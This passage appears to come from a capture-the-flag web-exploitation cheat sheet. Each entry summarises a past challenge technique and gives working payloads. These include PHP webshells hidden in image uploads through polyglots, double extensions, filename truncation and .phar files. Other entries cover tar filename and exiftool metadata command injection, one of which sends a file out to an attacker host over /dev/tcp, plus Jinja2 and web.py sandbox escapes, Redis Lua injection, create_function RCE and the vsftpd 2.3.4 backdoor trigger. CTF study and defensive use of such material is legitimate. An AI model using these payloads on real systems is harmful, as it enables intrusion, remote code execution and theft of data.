**Pattern (trendyweb):** Server uses `wget` to download user-provided URLs and `parse_url()` to validate the path. Wget saves files with GET parameters in the filename, creating a `.php` extension bypass.

```text
URL: http://attacker.com/avatar.png?shell.php
parse_url($url)['path'] = '/avatar.png'      # passes .png check
wget saves as: avatar.png?shell.php           # server treats as PHP
```

Access via URL-encoded `?`: `http://target/data/hash/avatar.png%3fshell.php?cmd=id`

**Key insight:** `wget` preserves GET parameters in the output filename when no `-O` flag is specified. `parse_url()` separates path from query, so validation only sees the path extension. The resulting file has a `.php` extension from the query string portion, which Apache/nginx interprets as PHP.

---

## Tar Filename Command Injection (CyberSecurityRumble 2016)

**Pattern (Jobs):** Server extracts tar archives and displays filenames via a `.cgi` script. Filenames containing shell metacharacters are passed to shell without sanitization.

```bash
# Create tar with command injection filename
mkdir exploit && cd exploit
touch 'name; cat /flag #'
tar cf exploit.tar *
# Upload — server runs: echo "name; cat /flag #" in CGI context
```

**Key insight:** When server-side scripts process filenames from user-uploaded archives (tar, zip) via shell commands, special characters in filenames become injection vectors. The semicolon breaks out of the filename context, and `#` comments out trailing characters. Always sanitize filenames from untrusted archives before shell interpolation.

---

## PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)

**Pattern (Brand Kit):** Upload filter rejects `.php` extension but accepts image uploads. nginx/PHP-FPM executes files ending in `.php` regardless of preceding extensions. `disable_functions` blocks all command execution functions, but filesystem functions remain available.

**Step 1: Create PNG/PHP polyglot**
```bash
# Create a valid PNG that also contains PHP code after the IEND chunk
# PHP interpreter ignores binary data before <?php
cp valid_image.png polyglot.png.php

# Append PHP payload after the PNG IEND marker
cat >> polyglot.png.php << 'PAYLOAD'
<?php
// disable_functions blocks system/exec/passthru/shell_exec/popen/proc_open
// Use filesystem functions instead
$files = scandir('/');
foreach ($files as $f) {
    if (strpos($f, 'flag') !== false || strpos($f, 'ctf') !== false) {
        echo "FOUND: $f\n";
        echo file_get_contents("/$f");
    }
}
// Fallback: list everything
echo "\n--- Full listing ---\n";
print_r($files);
?>
PAYLOAD
```

**Step 2: Upload with double extension**
```bash
# Filter checks extension — .png.php has .php at the end
# Some filters only check first extension (.png) or reject exact match on .php
curl -F 'file=@polyglot.png.php;type=image/png' http://target/upload

# Alternative double extensions to try:
# .png.php    .jpg.php    .gif.php
# .png.phtml  .png.phar   .png.php5
# .php.png (some filters check last extension, nginx checks .php anywhere)
```

**Step 3: Access and enumerate**
```bash
# The uploaded file is served by nginx which passes .php to PHP-FPM
curl http://target/uploads/polyglot.png.php

# If flag filename is randomized, first enumerate:
# scandir('/') reveals: flag_a8f3c9d2e1.txt
# Then read it with file_get_contents()
```

**Useful PHP functions when `disable_functions` blocks execution:**
```php
<?php
// File discovery
scandir('/');                          // List directory
glob('/flag*');                        // Glob pattern match
file_exists('/flag.txt');              // Check existence

// File reading
file_get_contents('/flag.txt');        // Read entire file
readfile('/flag.txt');                 // Output file directly
file('/flag.txt');                     // Read as array of lines
fopen('/flag.txt', 'r');              // Stream-based read

// Environment / info leaking
phpinfo();                             // Full PHP config, env vars
getenv('FLAG');                        // Environment variable
get_defined_vars();                    // All variables in scope

// If open_basedir is set, check what's allowed:
ini_get('open_basedir');
ini_get('disable_functions');
?>
```

**Key insight:** Three layers work together: (1) PNG/PHP polyglot passes image validation because it starts with valid PNG magic bytes; (2) double extension `.png.php` bypasses filters that reject `.php` but passes nginx's location regex that matches `\.php$`; (3) when `disable_functions` blocks all command execution, `scandir()` + `file_get_contents()` remain available for directory listing and file reading. Always enumerate the filesystem first when `disable_functions` is in play -- the flag filename is often randomized.

**When to recognize:** File upload challenge with image-only restrictions. Check `phpinfo()` output for `disable_functions` list. If all exec functions are blocked, pivot to pure PHP filesystem functions.

**References:** MetaCTF Flash CTF 2026 "Brand Kit"

---

### PHP BMP Pixel Webshell with Filename Truncation (Nuit du Hack CTF 2018)

**Pattern:** Encode PHP code as BMP pixel colors (BGR format). The server validates the file extension (e.g., requires `.JPG` or `.BMP`) but truncates filenames to a maximum length. Craft a filename like `'A'*46 + '.php.JPG'` that passes the `.JPG` extension check but truncates to `'A'*46 + '.php'` at the 50-character limit.

**How BMP pixel encoding works:**
```python
import struct
import requests

# BMP files store pixel data as raw bytes in BGR order (Blue, Green, Red)
# PHP ignores non-PHP content before <?php tags
# So embedding PHP code in pixel color values creates a valid BMP that is also valid PHP

payload = "<?php @$_GET[a]($_GET[b]);?>"

def pad(s, block=3):
    """Pad payload to multiple of 3 bytes (one pixel = 3 color bytes)."""
    while len(s) % block != 0:
        s += " "
    return s

def chunk(s, n):
    """Split string into n-byte chunks."""
    return [s[i:i+n] for i in range(0, len(s), n)]

# Read a template BMP file (small valid BMP, e.g., 10x10)
with open("template.bmp", "rb") as f:
    data = bytearray(f.read())

# Find the pixel data offset (stored at byte 10-13 in BMP header)
pixel_offset = struct.unpack_from('<I', data, 10)[0]

# Encode PHP payload as BMP pixel colors
padded = pad(payload)
index = pixel_offset
for c in chunk(padded, 3):
    data[index + 2] = ord(c[0])  # R -> B in BMP format (BGR order)
    data[index + 1] = ord(c[1])  # G stays
    data[index] = ord(c[2])      # B -> R in BMP format
    index += 4  # skip alpha byte (if 32-bit BMP) or use 3 for 24-bit

# Filename truncation exploit:
# Server checks extension: must end with .JPG or .BMP
# Server truncates filename to 50 chars
# "A" * 46 + ".php" = 50 chars (after truncation)
# "A" * 46 + ".php" + ".JPG" = 54 chars (passes extension check before truncation)
name = "A" * 46 + ".php"

# Upload with the extension that passes validation
requests.post(
    "http://target/upload",
    data={"data": str(list(data)), "name": name + ".JPG", "format": "BMP"}
)

# Access the webshell (filename truncated to .php)
r = requests.get(f"http://target/uploads/{name}", params={"a": "system", "b": "cat /flag.txt"})
print(r.text)
```

**Filename truncation variants:**
```text
# 50-char limit example:
"A"*46 + ".php" + ".JPG"     -> truncated to "A"*46 + ".php"  (50 chars)
"A"*46 + ".php" + ".png"     -> truncated to "A"*46 + ".php"  (50 chars)

# Other truncation lengths — adjust padding:
# For N-char limit: "A"*(N-4) + ".php" + ".ext"
# The ".ext" passes the extension check, then gets truncated away
```

**Key insight:** BMP files store pixel data as raw bytes in BGR order. PHP ignores non-PHP content before `<?php` tags. When the server truncates filenames to a fixed length, `'A'*46 + '.php' + '.JPG'` passes extension validation but saves as `.php`. This combines three bypass techniques: (1) polyglot file format (valid BMP + valid PHP), (2) extension check evasion via filename truncation, (3) webshell hidden in image pixel data survives re-encoding unless the server re-renders the image from scratch.

---

## Editor Backup File Source Disclosure (h4ckc0n 2017)

**Pattern:** Text editors leave backup files alongside the original when saving. These are often left on web servers and served as plain text, leaking PHP source before execution.

| Editor | Backup pattern |
|--------|---------------|
| gedit  | `file~` |
| vim    | `.file.swp` (also `.file.swn`, `.file.swo`) |
| nano   | `file~` |
| emacs  | `file~` and `#file#` |

```bash
# Check common backup variants for a target file
TARGET="http://target/checker.php"
for suffix in "~" ".swp" ".bak" ".orig"; do
    curl -s -o /dev/null -w "%{http_code} $TARGET$suffix\n" "$TARGET$suffix"
done
# vim hidden-file backup:
curl -s "http://target/.checker.php.swp"
# emacs auto-save:
curl -s "http://target/#checker.php#"
```

```bash
# Practical: grab vim swap file and recover source
curl -o checker.swp "http://target/.checker.php.swp"
vim -r checker.swp          # opens recovered file in vim
# Or: strings checker.swp   # quick content extraction
```

**Key insight:** Always check for `filename~`, `.filename.swp`, `#filename#` variants when hunting for source disclosure. Combine with directory listing or known filenames from JS/HTML comments to enumerate candidates.

---

## date -f Arbitrary File Read (Can-CWIC 2017)

**Pattern:** The GNU `date` command's `-f`/`--file` flag reads each line from a file and processes it as a date format string. When user-controlled input reaches a `date` invocation as an argument, this provides arbitrary file read.

```bash
# Normal behavior: date -f /etc/passwd reads each line as a date string
# Lines that aren't valid dates print an error message containing the line content
date -f /etc/passwd
# Output includes: date: invalid date 'root:x:0:0:root:/root:/bin/bash'
# → file contents leak through error messages
```

```python
import subprocess

# Simulate: if web app passes user arg to date command
# e.g., os.system(f"date -d '{user_input}'") where user controls the flag value
# Or: user_input = "-f /etc/passwd" injected into arguments

# Brute-force readable files
targets = ['/etc/passwd', '/flag', '/flag.txt', '/home/ctf/flag']
for t in targets:
    result = subprocess.run(['date', '-f', t], capture_output=True, text=True)
    print(result.stderr)  # errors contain file content
```

```bash
# When command injection is available and date is accessible:
curl "http://target/cgi-bin/app.cgi" --data "cmd=date+-f+/flag.txt"
# Response error output reveals flag content
```

**Key insight:** `date --file` / `date -f` provides arbitrary file read when the `date` command has user-controlled arguments. Error messages include the unrecognized line content, leaking the file line-by-line. Works on any system with GNU coreutils `date`.

---

## Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)

**Pattern:** Apache mod_rewrite rules match on the request path using regex. Accessing `/index.php/getflag` matches a permissive rule for `/index.php` (allowing the PHP file to handle the request) before any restrictive rule for `/getflag` applies. PHP receives `/getflag` as `PATH_INFO`.

```apache
# Vulnerable .htaccess / rewrite rules:
RewriteRule ^index\.php$ index.php [L]          # allows access to index.php
RewriteRule ^getflag$    /forbidden.html [R,L]  # blocks /getflag directly
```

```bash
# Direct access — blocked by second rule:
curl http://target/getflag          # → 403 or redirect to forbidden.html

# PATH_INFO bypass — matches first rule, PHP gets PATH_INFO=/getflag:
curl http://target/index.php/getflag   # → executes index.php with PATH_INFO=/getflag
```

```php
// In index.php — reads PATH_INFO to dispatch
$action = $_SERVER['PATH_INFO'];   // "/getflag"
if ($action === '/getflag') {
    echo $flag;
}
```

**Rule ordering matters:** Apache evaluates RewriteRules top-to-bottom and stops at the first `[L]` match. A permissive rule for the PHP file catches `/index.php/anything` before any restrictive rule for the suffix path.

**Key insight:** mod_rewrite rule ordering + PHP PATH_INFO interaction: `/index.php/protected-path` bypasses access controls by matching the PHP file rule first. PHP's `$_SERVER['PATH_INFO']` receives the suffix, letting the application's own routing dispatch to the protected handler.

---

## PHP ReDoS to Skip Code Execution (CODE BLUE 2017)

**Pattern:** PHP's `preg_match()` is synchronous. When a regex with catastrophic backtracking complexity matches user-controlled input, the PCRE engine times out and `preg_match()` returns `false`. Code that runs after the regex check (e.g., an INSERT into an ACL table) never executes. A missing ACL record then becomes equivalent to having no access restriction — or the most permissive default.

```php
// Vulnerable pattern: regex check followed by ACL insert
if (preg_match('/^(ADMIN-+)+$/', $role)) {
    // If this times out (returns false), the block is never entered
    // AND code after the if-block may also be skipped or behave differently
}
// ACL INSERT that only runs on successful match:
$db->query("INSERT INTO acl (user, role) VALUES (?, ?)", [$user, 'ADMIN']);
// Missing ACL row = no restriction applied
```

```python
import requests

# Payload: trigger catastrophic backtracking on the regex (ADMIN-+)+
# The nested quantifier causes exponential backtracking with enough repetitions
redos_payload = 'ADMIN-' + '-' * 50 + '!'   # trailing ! forces full backtrack
# Or the classic: ADMIN--(###A)*  structure repeated

r = requests.post('http://target/register', data={
    'username': 'victim',
    'role': redos_payload
})
# If the ACL INSERT is skipped, the user now has no restriction on their account
```

**Backtracking trigger patterns:**
```text
ADMIN--(###A)*  repeated 20+ times
(ADMIN-+)+X     where X doesn't match, forcing full backtrack
```

**Key insight:** PHP ReDoS can skip subsequent code entirely — a timed-out `preg_match()` returns `false` (not `0`), and any code gated on that check (like an ACL table INSERT) is silently skipped. This is not just a DoS: it acts as a code execution bypass when missing side effects change application security state.

---

## Custom Serializer Integer Overflow 256 to 0 Length (Codegate 2018)

**Pattern:** A custom PHP file-based database stores records with a format of `<type_byte><length_byte><data>` per field. The length is stored in a single byte (`chr(len)`). When a field value is exactly 256 bytes, `chr(256)` wraps to `\x00` (null byte), making the parser treat the length as 0. The remaining 256 bytes of data spill into subsequent field boundaries, allowing the attacker to overwrite fields like password hash or privilege level.

```python
import hashlib
import requests

# Custom DB format per field: \x01 (string type) + chr(length) + data
# Fields stored in order: email, ip, level
# Goal: overwrite the password hash and level fields by overflowing email

# Craft the payload to inject into the "email" field
target_password = "hacked"
pw_hash = hashlib.md5(target_password.encode()).hexdigest()  # 32 hex chars

# These are the fields we want to inject after the overflow
injected_mail = '\x01\x20' + pw_hash          # type=string, len=32, data=md5(pw)
injected_level = '\x01\x01' + '2'             # type=string, len=1, data='2' (admin)

# Calculate padding to make total email field exactly 256 bytes
overhead = len(injected_mail) + len(injected_level) + 2  # +2 for the ip field header
pad_len = 256 - overhead
injected_ip = '\x01' + chr(pad_len) + 'A' * pad_len  # type=string, padded ip field

# Combine: mail_data + ip_data + level_data = 256 bytes total
# When stored as email field: chr(256) = chr(0) = \x00 → length = 0
# Parser reads 0 bytes for email, then the 256 bytes become the next fields
payload_email = injected_mail + injected_ip + injected_level

# Register with the overflow payload as the email
r = requests.post("http://target/register", data={
    "email": payload_email,
    "password": target_password,
    "username": "attacker"
})
print(r.text)
```

```text
# How the overflow works in the file-based DB:

# Normal record layout:
# [email_type][email_len][email_data][ip_type][ip_len][ip_data][level_type][level_len][level_data]
#   \x01       \x10       user@x.com   \x01    \x09   127.0.0.1  \x01       \x01       1

# Overflow: email is 256 bytes → chr(256) = \x00
# [email_type][0x00][...256 bytes of attacker data...]
#   \x01       \x00  ← parser reads 0 bytes for email
#                    ← the 256 bytes are now parsed as ip, level, etc.
#                    ← attacker controls password hash and level fields
```

```python
# Generalized overflow finder for custom serialization formats
def find_overflow_length(field_width_bytes):
    """
    Calculate the overflow value for N-byte length fields.
    1 byte: overflows at 256 → 0
    2 bytes: overflows at 65536 → 0
    """
    return 2 ** (8 * field_width_bytes)

# 1-byte length: 256 → 0
assert find_overflow_length(1) == 256
# 2-byte length: 65536 → 0
assert find_overflow_length(2) == 65536
```

**Key insight:** Single-byte length fields overflow at 256 to 0, letting data from one field spill into subsequent fields. Any custom serialization format using fixed-width length fields is vulnerable. Look for field length stored in 1 byte (max 255) or 2 bytes (max 65535). Signs of custom serialization: binary file-based databases, custom session formats, proprietary protocol parsers. The attack requires knowing (or guessing) the exact field order and format in the serialized structure. See also [server-side-deser.md](server-side-deser.md) for standard deserialization attacks.

---

## Unanchored Regex Command Injection (picoCTF 2018)

**Pattern:** Input validation uses `preg_match('/^<ip-pattern>/i', $ip)` — missing a trailing `$` end-of-string anchor. The match succeeds as long as the string *starts* with a valid IP, so the attacker appends a semicolon and a shell command that still reaches the later `exec("ping $ip")`.

```php
// Vulnerable
if (preg_match('/^(\d{1,3}\.){3}\d{1,3}/', $_GET['ip'])) {
    exec("ping -c 1 " . $_GET['ip']);
}
```

```bash
curl "http://target/ping.php?ip=1.1.1.1;cat%20/flag.txt"
# matches ^1.1.1.1 then executes: ping -c 1 1.1.1.1;cat /flag.txt
```

**Key insight:** `^pattern` without `$` only fixes the prefix, not the suffix. Every form of input validation regex must anchor both ends or use `preg_match('/\A...\z/')`. When auditing, grep for `preg_match('/\^` and check that each hit also has `\$/` or `\\z/`. The same bug appears in JavaScript `String.match` and Python `re.match` (which is implicitly left-anchored but not right-anchored).

**References:** picoCTF 2018 — Fancy Alive Monitoring, writeups 11706, 11721, 11761

---

## Jinja2 SSTI via globals.__self__.exec() String Concat Bypass (InCTF 2018)

**Pattern:** Template filter blocks `__class__`, `os`, `import`, `eval`, `subprocess`, and a few other literals. Walk from any already-bound Jinja variable to `globals.__self__` (the Python builtins module) and call `exec` on a payload whose forbidden substrings are rebuilt at runtime from string concatenation.

```text
{{ globals.__self__.exec("imp" + "ort o" + "s;o" + "s.system('cat /flag')") }}

# Alternative via any Python object already in context:
{{ request.__class__.__init__.__globals__.__builtins__.exec(
    "__imp"+"ort__('o'+'s').system('id')"
) }}
```

**Key insight:** Any function object in Jinja's scope exposes `__globals__` (and via that, the real `builtins`). Even when `os`, `import`, and `__class__` are blacklisted, string concatenation and `chr(...)`-style tricks split the forbidden words across literal segments that the pre-render filter never sees joined. To harden, use `jinja2.sandbox.SandboxedEnvironment` instead of a string blocklist.

**References:** InCTF 2018 — TorPy, writeup 11519

---

## web.py reparam() eval + __subclasses__ with Blanked Builtins (HITCON 2018)

**Pattern:** `web.py`'s `reparam()` calls `eval(expr, {"__builtins__": object()}, context)` to interpolate `${...}` placeholders into SQL. `__builtins__` is replaced with a bare `object()` to block `__import__`, but `[].__class__.__base__.__subclasses__()` still enumerates every loaded class — including `subprocess.Popen`. An SQLi-like injection in the `limit` or `order` parameter escapes into the eval context.

```python
# web.py 0.38 sink (db.select passes limit through reparam)
db.select('posts',
          limit=user_input,   # interpolated via ${...} eval
          order='ups desc')

# Payload — list all subclasses to locate Popen, then call it
user_input = (
    "1 ${[c for c in ().__class__.__base__.__subclasses__()"
    " if c.__name__ == 'Popen'][0](['/bin/sh','-c','cat /flag'],"
    "stdout=-1).communicate()[0]}"
)
```

**Key insight:** Replacing `__builtins__` with a blank object blocks `__import__`, `open`, and `eval`, but class-tree traversal still reaches any module imported before the sandbox was set up. Any Python eval that does not also replace `__builtins__` with `{"__builtins__": {}}` *and* restrict globals is bypassable via `().__class__.__base__.__subclasses__()`. Look for framework-level eval in Django templates (`{% eval %}`), web.py `reparam`, Flask Jinja with custom filters, and Mako `<%...%>` blocks.

**References:** HITCON CTF 2018 — Oh My Raddit v2, writeup 11931

---

## Redis Lua Injection via redis.call() (HumanCTF 2018)

**Pattern:** Application runs a Redis Lua script with a user-controlled argument that is concatenated into the script source instead of passed as `ARGV`. The attacker breaks out of the string literal and invokes `redis.call('GET', 'admin')` — Lua's direct Redis bridge — to read blocked keys.

```lua
-- Vulnerable script (string-concatenated)
local script = "return redis.call('GET', '" .. user_key .. "')"
redis.eval(script, 0)
```

```text
# Injected parameter
?n=123') and redis.call('get', 'admin') --

# Final Lua:
return redis.call('GET', '123') and redis.call('get', 'admin') -- ')
```

```python
import requests
r = requests.get("http://target/admin", params={
    "n": "123') and redis.call('get', 'admin') --"
})
print(r.text)
```

**Key insight:** Redis Lua scripts expose `redis.call()` and `redis.pcall()` — they are the intended Redis bridge inside Lua, so a blocklist of Redis commands in the HTTP layer is useless once any Lua injection lands. Always pass untrusted values through `KEYS[...]` / `ARGV[...]`, never concatenate them into the script body. When Lua is unavoidable, sandbox the script with `redis-cli SCRIPT LOAD` + signed SHA1 and refuse scripts the client did not precompile.

**References:** HumanCTF / HackOver 2018 — No vuln, trust me, writeup 11816

---

## PHP create_function String Interpolation RCE (FireShell 2019)

**Pattern:** Classic PHP gadget: server calls `create_function('$a, $b', 'return strcmp($a->'.$order.', $b->'.$order.');')` with a user-controlled `$order`. Supply `; system($_GET[c]); return 0; //` to close the `strcmp` prematurely and run arbitrary PHP inside the generated anonymous function.

```text
order=;system($_GET[c]);return 0;//
&c=id
```

**Key insight:** Any PHP function that builds code from a string and hands it to `eval`/`create_function`/`assert` accepts arbitrary PHP with the right semicolon/comment dance. Grep for `create_function` in legacy codebases — it is removed in PHP 8 but still common in CTFs mirroring 2018-era apps.

**References:** FireShell CTF 2019 — Bad injections, writeup 12917

---

## php://input + NULL Byte + ~Bitwise base64 Filter Bypass (DefCamp 2018)

**Pattern:** `include` endpoint expects a base64-encoded filename. `base64_decode` fails silently on invalid input, but the filename still gets written out as `$name.php`. Inject `name=z.php%00` to NULL-truncate the written filename, then send `data=_`.`~\x9c\x9e\x8b` via POST → `php://input`. PHP's bitwise-NOT operator (`~`) turns non-base64 bytes into ASCII opcodes like `cat`, evading the base64 validator while still landing executable PHP on disk.

```text
GET: ?name=z.php%00&file=php://input
POST body: <?=`~(chr(0x9c).chr(0x9e).chr(0x8b))`?>
```

Follow up with `GET /z.php?c=cat%20/flag`.

**Key insight:** Write-side filters that only check the URL-encoded name are bypassed by `%00`. Read-side filters that only check base64 alphabet are bypassed by PHP's non-string bitwise operators — they generate the same opcodes without ever matching the filter regex.

**References:** DefCamp CTF Finals 2018 — Scribbles, writeup 12131

---

## EXIF ImageDescription Shell Injection via exiftool (OTW Advent 2018)

**Pattern:** Server runs `exiftool` on uploaded images and pastes the `-ImageDescription` field into a shell command unquoted. Inject `; command` (or `$(cmd)`) directly into the metadata with an attacker-set exiftool write, then upload.

```bash
exiftool -ImageDescription="Santa ; /bin/bash -c 'cat /opt/flag > /dev/tcp/attacker/8081'" evil.jpg
curl -F upload=@evil.jpg http://target/
```

**Key insight:** Image upload sinks that parse metadata with `exiftool`, `identify`, or `ffprobe` often pipe the result straight to `exec`/`system`/`sh -c`. Any metadata string field — `ImageDescription`, `Artist`, `Software`, GPS tags — is a shell injection vector. Fix with `escapeshellarg()` or by exporting metadata as JSON and whitelisting field names.

**References:** OverTheWire Advent 2018 — Santa's little recorders, writeup 12753

---

## .phar Extension Bypass for PHP Upload Blacklists (35C3 2018)

**Pattern:** Apache's PHP handler also matches `.phar` by default, but upload filters frequently only blacklist `.php`, `.phtml`, `.phps`. Rename your shell to `.phar`, append a PHP payload to a valid image, upload — and the Apache handler parses it as PHP. Works through many XSS-protection / image-upload flows.

```http
POST /upload HTTP/1.1
filename=shell.phar

[JPEG header] <?php system($_GET["c"]); ?>
```

**Key insight:** Always enumerate every extension the PHP handler accepts. In default configs that is `.php`, `.phtml`, `.phps`, `.php3`, `.php4`, `.php5`, `.php7`, and `.phar`. Upload blacklists need all of them.

**References:** 35C3 CTF 2018 — express-yourself, writeup 12880

---

## vsftpd 2.3.4 Smiley-Face Backdoor (P.W.N. CTF 2018)

**Pattern:** vsftpd 2.3.4 shipped with a compromised source release (CVE-2011-2523): any username ending in `:)` triggers a bind shell on TCP port 6200. Detect the vulnerable version via FTP banner or service fingerprint; trigger the backdoor; connect to port 6200 for root shell.

```bash
ftp target 21
USER anonymous:)
nc target 6200
```

**Key insight:** Supply-chain backdoors live forever. Any FTP server running vsftpd 2.3.4 (version string in the banner) has this. Same class of backdoor hit proftpd-1.3.3c and unreal-ircd-3.2.8.1 — memorise the set.

**References:** P.W.N. CTF 2018 — Very Secure FTP, writeup 12060

---

*See also: [server-side.md](server-side.md) for core injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion).*
